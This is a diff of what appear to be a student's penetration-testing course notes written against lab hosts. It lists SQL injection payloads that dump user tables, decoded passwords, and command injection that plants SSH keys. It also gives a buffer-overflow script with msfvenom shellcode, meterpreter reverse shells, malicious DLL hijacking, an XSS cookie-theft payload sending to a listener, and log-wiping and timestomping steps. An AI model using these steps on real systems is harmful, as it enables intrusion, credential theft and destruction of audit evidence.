@@ -1,33 +1,982 @@
-Ping Sweep
-for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
- 
-ssh -MS /tmp/gray student@10.50.37.202
-ssh -S /tmp/gray gray -O forward -D9050
+Dry Run
 
-scanning from lin ops on jump 
-proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.111 -p-
+     10.50.29.85:8000
+     
+     xfreerdp /u:student /p:password /dynamic-resolution +glyph-cache +clipboard +glyph-cache /v:10.50.30.113
+     
+     10.50.37.23
+     MAKE THE MASTER SOCKET ON YOUR LIN OPS SINCE THERE IS NO JUMP BOX
+     nmap <ip>
+     nmap --script http-enum.nse 10.50.37.23 -p 80
+     File to read: ../../../../../etc/passwd
+     view page source so its easier to read 
+     do like 3 or 4 or 5 (../)s
+     ../../../../../etc/hosts
+     scan the network of the host found in /etc/hosts
+     ssh with creds found in /scripts
+     Upload image: upload webshell
+     You need to upload and get to directory 
+     Contact information: Not much use
+     
+     admin profile
+     tom' or 1 = '1 pass and username
+     f12, go to network -> html -> request, copy the stuff found
+     link.#.#.#?<paste stuff found >
+     paste into schyber schef, rot13 or base64
+     
+     
+     Place second Master Socket onto Target and proxychains nmap 10.10.28.30
+     ssh -MS /tmp/two user2@10.50.37.23
+     
+     on box:
+     /bin/bash
+     for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+     cat /etc/hosts
+     did proxychains nmap, came up with ports 22 and port 80 open
+     then I made a tunnel to the 80 and went on the website.
+     Found it had lists, so i did 
+     ?product = 7 UNION select 1,2,3;
+     it appeared 1 3 2
+     ?product = 7 UNION select 1,3,2;
+     so that means in http://127.0.0.1:41804/pick.php?product=7 UNION select table_schema,column_name, table_name from information_schema.columns;#
+     it will go  table schema, table name, and column name in order
+     select 3 columns, from table_schema.table_name
+     http://127.0.0.1:41804/pick.php?product=7 UNION select table_schema,column_name, table_name from information_schema.columns;#
+     It didn't work on the first product, did prod 7
+     did the following
+     http://127.0.0.1:41804/pick.php?product=7 UNION select user_id, name, username from siteusers.users;#
+     and found passwords. Passwords are either going to be in ROT13 or Base64, converted they are
+     
+     AARON: apasswordyPa$$word
+     user2:EaglesIsARE78
+     user3:Bob4THEEapples
+     
+     yeah just ssh in
+     
+     look at /etc/passwd
+     cat /etc/hosts
+     even do arp -a
+     find / -type f -perm (that command, its in student guide and go to GTFO bins)
+     even do sudo -l and see what you find
+     abuse it with GTFO BINS
+     exploit  the other box found on the first box, which you would find with ping sweeping the network, with nmap.
+     now make a tunnel to vulnerable rdp port , banner grab the ports nc ip port
+     once you hit that windows, use the msfvenom commands with multi handler
+     then use xfreerdp on it
+     xfreerdp /u:user p:/password /dynamic-resolution +clipboard /v:127.0.0.1:port made for rdp tunnel
+      if you get error code, delete the contents of the file shown
+     
+     once you get on look at 
+     services, scheduled tasks, and registry
+     
+     find exe in services or task scheduler
+     tasklist /svc | find "(service)"
+     
+     find the pid and coorelate the network connection with
+     netstat -ano | findstr "pid"
+     could banner grab it as well
+     
+     even look at the windows defender
+     
+     %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+     *******************************************************************PRACTICE*******************************************************************
+     %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+     Cars we sell POST method
+     Ford' or 1 = '1
+     Honda' or 1 = '1
+     Dodge' or 1 = '1
+     Audi' or 1 = '1
+     
+     audi gave results,
+     
+     Audi' UNION select 1,2,3 #
+     keep adding until it spits out an output
+     Audi' Union select 1,2,3,4,5 # works, but it doesn't display 2. 2 is just filler so we can see what we want, so it will look a lot like this
+     Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+     
+     Exploit Development (The gdb stuff)
+     https://github.com/jacksonwilkie/Security/blob/main/Exploit%20Development
+     
+     CMD Injection for your own password
+     ssh-keygen -t rsa -b 4096
+     cmd injection::::: mkdir /.ssh
+     ;echo "(paste publickey)" > /var/www/.ssh/authorized_keys
+     ;cat /var/www/.ssh/authorized_keys
+     
+     one > will create a file, two >> will append to a file
+     
+     ssh -i id_ ( idk look in student guide ezpz)
+     
+     \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+     --------------------------------------------------------------RECAP---------------------------------------------------------------------------------------
+     //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+     Every linux box: /etc/passwd, /etc/hosts, cat out user directories, /etc/crontabs, /tmp, find / perm command, look in any scripts found if possible
+                                                                                 
+                                                                         port 22 open
+               _---------------------------------------------------------->192.168.28.172
+     Lin OPS -/-> user2 /---------------------------->192.168.28.181 ----------------------------------------------------------->Windows ip
+               nmap http-enum scan                    ports 80 and 22 open                                                          Made tunnel to RDP Port and then ran an xfreerdp on it
+               cat /etc/hosts                         http-enum scan, scanning new network
+               Master Socket made                     SQL 
+               nmap found ports 22 and 80                10.50.29.85:8000
+     
+     xfreerdp /u:student /p:password /dynamic-resolution +glyph-cache +clipboard +glyph-cache /v:10.50.30.113
+     
+     10.50.37.23
+     MAKE THE MASTER SOCKET ON YOUR LIN OPS SINCE THERE IS NO JUMP BOX
+     nmap <ip>
+     nmap --script http-enum.nse 10.50.37.23 -p 80
+     File to read: ../../../../../etc/passwd
+     view page source so its easier to read 
+     do like 3 or 4 or 5 (../)s
+     ../../../../../etc/hosts
+     scan the network of the host found in /etc/hosts
+     ssh with creds found in /scripts
+     Upload image: upload webshell
+     You need to upload and get to directory 
+     Contact information: Not much use
+     
+     admin profile
+     tom' or 1 = '1 pass and username
+     f12, go to network -> html -> request, copy the stuff found
+     link.#.#.#?<paste stuff found >
+     paste into schyber schef, rot13 or base64
+     
+     
+     Place second Master Socket onto Target and proxychains nmap 10.10.28.30
+     ssh -MS /tmp/two user2@10.50.37.23
+     
+     on box:
+     /bin/bash
+     for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+     cat /etc/hosts
+     did proxychains nmap, came up with ports 22 and port 80 open
+     then I made a tunnel to the 80 and went on the website.
+     Found it had lists, so i did 
+     ?product = 7 UNION select 1,2,3;
+     it appeared 1 3 2
+     ?product = 7 UNION select 1,3,2;
+     so that means in http://127.0.0.1:41804/pick.php?product=7 UNION select table_schema,column_name, table_name from information_schema.columns;#
+     it will go  table schema, table name, and column name in order
+     select 3 columns, from table_schema.table_name
+     http://127.0.0.1:41804/pick.php?product=7 UNION select table_schema,column_name, table_name from information_schema.columns;#
+     It didn't work on the first product, did prod 7
+     did the following
+     http://127.0.0.1:41804/pick.php?product=7 UNION select user_id, name, username from siteusers.users;#
+     and found passwords. Passwords are either going to be in ROT13 or Base64, converted they are
+     
+     AARON: apasswordyPa$$word
+     user2:EaglesIsARE78
+     user3:Bob4THEEapples
+     
+     yeah just ssh in
+     
+     look at /etc/passwd
+     cat /etc/hosts
+     even do arp -a
+     find / -type f -perm (that command, its in student guide and go to GTFO bins)
+     even do sudo -l and see what you find
+     abuse it with GTFO BINS
+     exploit  the other box found on the first box, which you would find with ping sweeping the network, with nmap.
+     now make a tunnel to vulnerable rdp port , banner grab the ports nc ip port
+     once you hit that windows, use the msfvenom commands with multi handler
+     then use xfreerdp on it
+     xfreerdp /u:user p:/password /dynamic-resolution +clipboard /v:127.0.0.1:port made for rdp tunnel
+      if you get error code, delete the contents of the file shown
+     
+     once you get on look at 
+     services, scheduled tasks, and registry
+     
+     find exe in services or task scheduler
+     tasklist /svc | find "(service)"
+     
+     find the pid and coorelate the network connection with
+     netstat -ano | findstr "pid"
+     could banner grab it as well
+     
+     even look at the windows defender
+     
+     %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+     *******************************************************************PRACTICE*******************************************************************
+     %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+     Cars we sell POST method
+     Ford' or 1 = '1
+     Honda' or 1 = '1
+     Dodge' or 1 = '1
+     Audi' or 1 = '1
+     
+     audi gave results,
+     
+     Audi' UNION select 1,2,3 #
+     keep adding until it spits out an output
+     Audi' Union select 1,2,3,4,5 # works, but it doesn't display 2. 2 is just filler so we can see what we want, so it will look a lot like this
+     Audi' UNION select table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+     
+     Exploit Development (The gdb stuff)
+     https://github.com/jacksonwilkie/Security/blob/main/Exploit%20Development
+     
+     CMD Injection for your own password
+     ssh-keygen -t rsa -b 4096
+     cmd injection::::: mkdir /.ssh
+     ;echo "(paste publickey)" > /var/www/.ssh/authorized_keys
+     ;cat /var/www/.ssh/authorized_keys
+     
+     one > will create a file, two >> will append to a file
+     
+     ssh -i id_ ( idk look in student guide ezpz)
+     
+     \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+     --------------------------------------------------------------RECAP---------------------------------------------------------------------------------------
+     //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+     Every linux box: /etc/passwd, /etc/hosts, cat out user directories, /etc/crontabs, /tmp, find / perm command, look in any scripts found if possible
+                                                                                 
+                                                                         port 22 open
+               _---------------------------------------------------------->192.168.28.172
+     Lin OPS -/-> user2 /---------------------------->192.168.28.181 ----------------------------------------------------------->Windows ip
+               nmap http-enum scan                    ports 80 and 22 open                                                          Made tunnel to RDP Port and then ran an xfreerdp on it
+               cat /etc/hosts                         http-enum scan, scanning new network
+               Master Socket made                     SQL 
+               nmap found ports 22 and 80                
 
-ssh -S /tmp/gray gray -O forward -L 41899:192.168.28.111:80 (Creates Local port forward on port 80)
-ssh -S /tmp/gray gray -O forward -L 41898:192.168.28.111:22 (Creates Local port forward on port 22)
- proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192/168/28.111 -p 80
+Day 1
+     
+     Ping Sweep
+     for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+      
+     ssh -MS /tmp/gray student@10.50.37.202
+     ssh -S /tmp/gray gray -O forward -D9050
+     
+     scanning from lin ops on jump 
+     proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.111 -p-
+     
+     ssh -S /tmp/gray gray -O forward -L 41899:192.168.28.111:80 (Creates Local port forward on port 80)
+     ssh -S /tmp/gray gray -O forward -L 41898:192.168.28.111:22 (Creates Local port forward on port 22)
+      proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192/168/28.111 -p 80
+     
+     firefox 
+     http://127.0.0.1:41899/
+     ssh -S /tmp/gray gray -O cancel -L 41899:192.168.28.111:80 (Only cancel your mocket when you want to change your Dynamic Port Forwards)
+     
+     
+     Master Socket referencing a previous Master Socket to get to the next network:
+     
+     ssh -S /tmp/gray gray -O forward -L 41899:192.168.28.111:80 (Creates Local port forward on port 80)
+     ssh -S /tmp/gray gray -O forward -L 41898:192.168.28.111:22 (Creates Local port forward on port 22)
+     sh -MS  /tmp/comrade comrad@127.0.0.1 -p 41898 (USES THE -P 41898 TO REFERENCE PORT OPEN FROM THE /tmp/gray MASTER SOCKET)
+     
+     Cancel the Dynamic Tunnel
+     ssh -S /tmp/gray gray -O cancel -D9050
+     
+     Set up a new Dynamic Tunnel
+     ssh -S /tmp/comrade comrade -O forward -D9050
+     
+     smb os discovery
+     
+     nmap -Pn -T4 -sV --script=smb-os-discovery <ip>
 
-firefox 
-http://127.0.0.1:41899/
-ssh -S /tmp/gray gray -O cancel -L 41899:192.168.28.111:80 (Only cancel your mocket when you want to change your Dynamic Port Forwards)
+
+Exploit Development
+
+     PART 1:
+     
+     chmod +x func
+     ./func
+     ./func
+     gdb ./func 
+     
+     gdb-peda$
+     pdisass main
+     
+     EX. call 0x3d0 <gets@plt> 
+     pdisass gets (disassembles gets func)
+     
+     run 
+     jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj
+     (CRASH AGAIN WITH PATTERN STRING ON wiremask.eu)
+     
+     Go to wiremask.eu, get the string and pase it where it says "Press enter to view inventory:" and then put the EIP in the Wiremask get offset, put the offset in script Where A * ##
+     
+     on TARGET SSH SESSION, go to the directory and 
+     gdb ./file
+     
+     CRASH
+     
+     info proc map  ------------------------------------------------------------
+                                                                                |
+     PART 2:                                                                    |
+                                                                                |     
+     env - gdb ./func                                                           |
+     disassemble getuserinput                                                   |
+     show env                                                                   |
+     unset env LINES                                                            |
+     unset env COLUMNS                                                          |
+     run                                                                        |
+     aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|aaaaaaaaaaaaaaaaa (CRASH)
+     info proc map <------------------------------------------------------------|
+     find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 (0xff = JMP in hex)             
+     find /b 0xf7def000, 0xfffdd000, 0xff, 0xe4                                 
+     SYNTAX:  ^start of stack AFTER HEAP LINE ^END OF STACK ^JMP ^0xe4 in hex   
+                                                 
+     TAKE TOP 3  HEX and convert to little indian
+     buf += "\x51\x1b\xdf\xf7"
+     
+     
+     
+     Add to mybuff.py
+     '''
+     0xf7de3b59 -> \x\x59\x3b\xde\xf7 JMP ESP  (this
+     0xf7f588ab
+     0xf7f645fb
+     '''
+     
+     
+     lin ops > msfdb init
+             > msfconsole
+                   > use payload/linux/x86/exec
+                   > show options 
+                   > set CMD 'the cmd you want to get the flag'
+                   > show options
+                   > generate -b '\x00' -f python (\x00 is getting rid of null bytes, which can fuck up our payload)
+                   copy the hex paragraph on the bottom of the page and take to script under OVERWRITE EIP REGISTER              
+                   > 
+                       #!/usr/bin/python2.7
+                       
+                       #Fill Buffer
+                       
+                       buf = "A" * 62
+                       
+                       #Overwrite EIP REGISTER
+                       buf += "\x59\x3b\xde\xf7"
+     
+                       # NOP SLED
+                       buf += "\x90" x 10
+     
+                       #Payload
+                        Buf += b"HEX PARAGRAPH"
+                        Buf += b"HEX PARAGRAPH"
+                        Buf += b"HEX PARAGRAPH"
+                        Buf += b"HEX PARAGRAPH"
+                        Buf += b"HEX PARAGRAPH"
+              
+                                     Do not include the buf += b''
+                                     buf += b"\xd9\xc2\xd9\x74\x24\xf4\xbb\x11\xe5\x11\xfb\x5a"
+                                     buf += b"\x29\xc9\xb1\x11\x31\x5a\x17\x03\x5a\x17\x83\xd3"
+                                     buf += b"\xe1\xf3\x0e\xb9\xe2\xab\x69\x6f\x93\x23\xa7\xec"
+                                     buf += b"\xd2\x53\xdf\xdd\x97\xf3\x20\x49\x77\x66\x48\xe7"
+                                     buf += b"\x0e\x85\xd8\x1f\x0d\x4a\xdd\xdf\x4d\x2b\xa9\xff"
+                                     buf += b"\xbe\x85\x22\x9a\xa3\xab\xa1\x10\x0b\x62\x5c\xbd"
+                                     buf += b"\x21\x03\xd3\x58\xa5\x81\x76\xd6\x07\x16\x1d\x74"
+                                     buf += b"\x58\x81\x8e\xf1\xb9\xe0\xb1"
+     
+                       print(buf)
+                   
+     
+     LIN -> comrade from LIN
+     scp -P <port for tunnel> <absolute path of file u wanna transfer mybuff.py in this instance> <comrade@127.0.0.1>:whereuwannago,if you dont givr a shit just give period
+     
+     
+     Lin> ./func <<<$(absolute path, use pwd for  location of mybuff.py)
+     Lin> msfvenom -l pinux/x86/exec CMD='whoami && ifconfig' -b '\x00' -f python
+     
+     
+     
+     
+     
+     ssh -MS /tmp/graystudent@Greyhostip
+     ssh -S /tmp/gray gray -O firward -L RHP:IP of first box:4242
+     ssh -MS /tmp/nxt student@127.0.0.1 -p newRHP
+     ssh -S /tmp/nxt nxt -O forward -L newrhp:secondbox:9999
+     student@lin-ops:~$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.37.2 lport=4444 "\x00" -f python, put the paragraph hex in script
+     msfconsole
+     use multi/handler
+     set payload windows/meterpreter/reverse_tcp
+     set lhost 0.0.0.0
+     set LPORT 4444
+
+Linux Exploitation
+     
+     Network related commands may require sudo
+     
+     which passwd
+     ls -la /usr/bin/passwd
+     ls -la /etc/shadow
+     
+     First place  directory looks when it calls a dll -- current directory
+     
+     See what cron is calling and walk it down.
+     Check what cron is calling on and if it's another directory that is out of the norm, that is a good spot to look.
+     
+     PERSISTANCE
+     unset HISTFILE
+     
+     Ways to find out init type
+     
+         ls -latr /proc/1/exe
+         stat /sbin/init
+         man init
+         init --version
+         ps 1
+     
+     /etc/inet
+     cat /etc/crontab
+     
+     Artifacts -Logs, tools, history file, files, coredump
+      ps -p 1
+     
+     Logs for Covering Tracks
+     
+             Logs typically housed in /var/log & useful logs:
+                 auth.log/secure
+             
+             Logins/authentications
+                 lastlog
+             
+             Each users' last successful login time
+                 btmp
+             
+             Bad login attempts
+                 sulog
+             
+             Usage of SU command
+                 utmp
+             
+             Currently logged in users (W command)
+                 wtmp
+             	
+             Permanent record on user on/off
+             Working With Logs
+     
+     file /var/log/wtmp
+     find /var/log -type f -mmin -10 2> /dev/null
+     journalctl -f -u ssh
+     journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+     
+     Reading Files
+     
+     cat /var/log/auth.log | egrep -v "opened|closed"
+     awk '/opened/' /var/log/auth.log
+     last OR lastb OR lastlog
+     strings OR dd            # for data files
+     more /var/log/syslog
+     head/tail
+     
+     Control your output with pipes | and more
+     
+     
+     Cleaning The Logs (Basic)
+             
+             Get rid of it 
+                 rm -rf /var/log/...
+             Clear It
+                 cat /dev/null > /var/log/...
+                 echo > /var/log/...
+     
+     Cleaning The Logs (Precise)
+     Always work off a backup!
+     
+             GREP (Remove)
+                 egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+             SED (Replace)
+                 cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+     
+     Timestomp
+     
+         touch -c -t 201603051015 1.txt   # Explicit
+         touch -r 3.txt 1.txt    # Reference
+         stat <file> - see which file has been timestomped
+         
+             
+     Rsyslog
+     
+         Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+             Older version only uses /etc/rsyslog.conf
+         Find out
+             grep "IncludeConfig" /etc/rsyslog.conf
+     
+     
+     --------------------------------------------------------------------------------------------------------------------------------
+     sudo -l
+     https://gtfobins.github.io/
+     
+     find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
+     
+     find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+     
+     find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
+     https://gtfobins.github.io/
+     crontab.guru
+     ls -la /var/tmp
+     echo $PATH
 
 
-Master Socket referencing a previous Master Socket to get to the next network:
+Post Exploitation
+     
+     Find a key in /tmp/user and authenticate SSH with said key.
+     
+     Process ebyneratuib 
+     tasklist /v 
+     ps -elf 
+     
+     Service enumeration 
+     tasklist /svc
+     chkconfig 
+     
+     Network connection Enumeration
+     ipconfig /all
+     ifconfig -a 
+     ip a 
+     
+     Svan Extranet with 
+     nmap <IP> --script http-enum
+     
+     
+     find  ./ -type 
+     
+     find / -iname "*mybuff*" 2>/dev/null
+     crontab cheat sheet
+     
+     Use Regedit or 
+     reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+     
+     Default location for windows event logs
+     C:\Windows\System32\config
+     
+     
+     
+     cat /etc/crontab
+     cat /etc/hosts
+     cat /tmp
+     
+     
+     
+     ssh -MS /tmp/gray student@10.50.37.202
+     3LmWtCZxs9pjREQ
+     ssh -S /tmp/gray gray -O forward -L 41899:192.168.28.100:80
+     firefox  -- 127.0.0.1:41899
 
-ssh -S /tmp/gray gray -O forward -L 41899:192.168.28.111:80 (Creates Local port forward on port 80)
-ssh -S /tmp/gray gray -O forward -L 41898:192.168.28.111:22 (Creates Local port forward on port 22)
-sh -MS  /tmp/comrade comrad@127.0.0.1 -p 41898 (USES THE -P 41898 TO REFERENCE PORT OPEN FROM THE /tmp/gray MASTER SOCKET)
+Priveledge Escalation, Persistence, Covering Tracks
 
-Cancel the Dynamic Tunnel
-ssh -S /tmp/gray gray -O cancel -D9050
+     DLL Hijacking
+           reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
+            
+           the DLL is not found the program will check the following locations, in order:
+           
+           The directory the the Application was run from (current working directory)
+                   The exact location on the hard drive where the program was executed from. Even locations such as C:\Users\Public\Downloads
+           
+           The directory specified in in the C+ function GetSystemDirectory() 
+                   The returned location is C:\Windows\system32 even on 64 bit systems.
+           
+           The directory specified in the C+ function GetWindowsDirectory()
+                   The returned location should always be C:\Windows
+               
+           The current directory
+                   The current directory assuming the application was executed using its full path.
+     
+     Windows Integrity Mechanism
+           six possible integrity levels:
+             Untrusted - Anonymous SID access tokens
+             Low - Everyone SID access token (World)
+             Medium - Authenticated Users
+             High - Administrators
+             System - system services (LocalSystem, LocalService, NetworkService)
+             Installer - Used by setup programs to install software.
+         
+     AutoElevate executables
+               The following are methods that will show AutoElevate settings for an executable
+               
+               sigcheck:
+               (Get-Command calc.exe).Path
+               sigcheck -m C:\WINDOWS\system32\calc.exe
+               
+               strings:
+               (Get-Command calc.exe).Path
+               strings C:\WINDOWS\system32\calc.exe
+               
+               notepad:
+               (Get-Command calc.exe).Path
+               notepad C:\WINDOWS\system32\calc.exe
+     
+     Scheduled Tasks and Services
+     
+         The following commands can be used to idenitfy vulnerable tasks using CMD and PowerShell:
+             schtasks /query /fo LIST /v
+     
+                 List all Tasks in List format
+             schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"
+     
+                 Select-String can utilize regex to output only values that match
+             schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
+     
+                 Searches for Task To Run and outputs that line, along with the 6 lines following it in order to show the Run As User setting too.
+             schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch
+     
+                 Excludes results that we dont want to seein order to help narrow down vulnerable directory locations
+             Open and view tasks from the Task Scheduler GUI Application
+     
+         Identify the following vulnerable Task:
+             C:\Users\student\exercise_2\putty.exe
+     
+         Run: sigcheck c:\users\student\exercise_2\putty.exe
+             Determines information we can use to research for vulnerabilities
+     
+         Run: icacls "c:\users\student\exercise_2"
+             Check if the directory can be written to, as it is non-standard
+     
+     The Windows registry includes the following four keys:
+         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
+     
+     Audit Logging
+     
+     auditpol /get /category:*
+         # Basic: Shows all audit category setting
+     
+     auditpol /get /category:* |findstr /i "success failure"
+         # Show all audit category set for success, failure, or success and fail
+     
+     auditpol /list /subcategory:"detailed Tracking","DS Access"
+         # Displays sub policy's for "Detailed Tracking","DS Access" categories.
+     
+     auditpol /get /option:crashonauditfail
+         # Check options that effect the system as a whole when certain events occur. The example would cause the system to crash if auditing would become unable to log events.
+     
+     DEMO: Event Logging
+     
+             wevtutil el
+                 # Show all logs on system, more logs exist other than event logging.
+             
+             wevtutil qe security /c:5 /rd:true /f:text
+                 # Show last 5 security logs.
+             
+             wevtutil gl microsoft-windows-audit/analytic
+                 # Configuration information for the specified log, which includes whether the log is enabled or not, the current maximum size limit of the log, and the path to the file where the log is stored.
+             
+             wevtutil qe system /c:5 /rd:false /f:text /q:"*[System[(EventID=104 or EventID=7040)]]"
+                 # Case sensitive, Show last 5 events that are EventID104 or 7040.
+             
+             wmic nteventlog list /format
+                 # Show configuration of eventlogs.
+             
+             wmic nteventlog get name
+                 # Show eventlog logs by name.
+             
+             wmic ntevent where "logfile="security" list full
+                 # Grabs all security logs
+             
+             wmic ntevent where "logfile="security and eventcode=4647" get category,insertionstrings
+                 # Display security eventID 4647 with category and insertionstrings data.
+             
+             Get-EventLog -?
+                 # help, shows command structure.
+             
+             Get-Eventlog -List
+                 # Displays all the logs.
+             
+             Get-EventLog security -newest 1 -instanceid 4672 \| format-list
+                 # Newest log with instanceid 4672
+             
+             Get-EventLog -LogName Security -Newest 50 \| Select Timegenerated,  @{Name="edwards";Expression={ $_.ReplacementStrings[1]}}, EventID, index \| format-list
+                 # Show events in security made by edwards username.
+             
+             Get-EventLog -LogName Security -Newest 50 -index 5399 \| format-list
+                 # Display newest 50 with index 5399 from Security log.
+     
+     Powershell Logging
+             reg query [hklm or hkcu]\software\microsoft\powershell\1\powershellengine\
+         # Hive check to determine PowerShell verison and log settings
+     
+             reg query [hklm or hkcu]\software\microsoft\powershell\3\powershellengine\
+         # PowerShell hive check
+     
+     Checking *Windows Management Instrumentation Command (WMIC) logging
+             reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
+     
+     dir /A /o:d /t:w
+         # Sorts files from oldest to newest by file write time. Newest files will be at the end of the output.
+     
+     forfiles /P c:\windows\system32 /S /D +05/14/2019
+         # Recursively lists the directory and sub directories matching the specified modified time criteria
+         # /S subdir recursively
+         # /D last modified time (+ greater than equal to)
+     
+     dir /O:D /T:W /A:-D
+         # /O:D List by files in sorted order
+         # /T:W will make the command use file modified time
+         # /A:-D will make it to print only files.
+     
+     wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
+         # Pulls the three specified dates from the identified file
+     
+     copy /b filename.ext +,,
+         # Sets the date to the current time
+     
+     Get-ChildItem -path c:\windows\system32
+         # List all files within a directory
+     
+     Get-ChildItem c:\windows\system32 -Force | Select-Object FullName, CreationTime, LastAccessTime, LastWriteTime, Mode, Length
+         # Lists all files within a directory along with there timestamps and permissions
+     
+     $(Get-Item file.ext).creationtime=$(date) |$(Get-Item test.txt).creationtime=$(Get-Date)
+         # Sets the date for today
+     
+     $(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")
+         # Sets the date specified
+     
+     $(Get-Item file.ext).lastwritetime=$(date) |$(Get-Item test.txt).lastwritetime=$(Get-Date "07/07/2004 05:18 am")
+         # Sets the date and time as specified
+     
+     -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+                                                              DEMO
+     Things to have open: Services, ProcMon, Task Scheduler
+     Task Scheduler, find a file
+     Go to file directory 
+     write to file check by making new test.txt
+     
+     tasklist /svc | findstr "putty"
+     
+     DLL HIJACK
+     We need to find what DLLS the binary is calling
+     ProcMon
+     filter
+     process name contains <.exe>
+     path contains .dll
+     result contains NAME NOT FOUND
+     the run <.exe>
+     
+     Making a DLL
+           Windows command prompt:
+           msfvenom -p windows/exec CMD='cmd.exe /C "command > C:\Fileisgoingforwritabledirectory' -f dll > nameofcalledupon.dll
+           scp student@linuxip:/home/student/SSPICLI.dll .
+           scp student@linuxip:/home/student/putty.exe .
+           make old putty, and place the new one in the same folder, view whoami.txt
+           msfvenom -p windows/exec CMD='cmd.exe /C "command C:\Filepath > C:\Fileisgoingforwritabledirectory' -f dll > nameofcalledupon.dll
+           
+           
+     
+     
+     Regedit
+     Look in HKLM AND HKCU
 
-Set up a new Dynamic Tunnel
-ssh -S /tmp/comrade comrade -O forward -D9050
 
-smb os discovery
+SCP Notes
 
-nmap -Pn -T4 -sV --script=smb-os-discovery <ip>
+      scp student@10.50.37.2:~/192.168.28.111/longTermStorage/sdst2.exe . 
+      
+
+      proxychains scp -P2222 comrade@192.168.28.111:/.hidden/inventory.exe .
+      
+      putting a file from your machine onto a different machine
+      LIN -> comrade from LIN
+      scp -P <port for tunnel> <absolute path of file u wanna transfer> <comrade@127.0.0.1>:whereuwannago,(((if you dont givr a shit just give period)))
+
+Web Exploitation
+
+      web scanners
+      nmap --script http-enum.nse 10.50.35.120 -p 80
+      nikto -host 10.50.35.120
+      
+      
+      WEB SERVER
+      <script>alert('hell0')</script>
+      python3 -m http.server
+      RECIEVE COOKIE only change ip in the script
+      <script>document.location="http://10.50.37.2:8000/"+document.cookie;</script>
+      
+      cmd injection
+      
+      ssh-keygen -t rsa -b 4096
+      ;echo "(paste publickey)" > /var/www/.ssh/authorized_keys
+      ;cat /var/www/.ssh/authorized_keys
+      
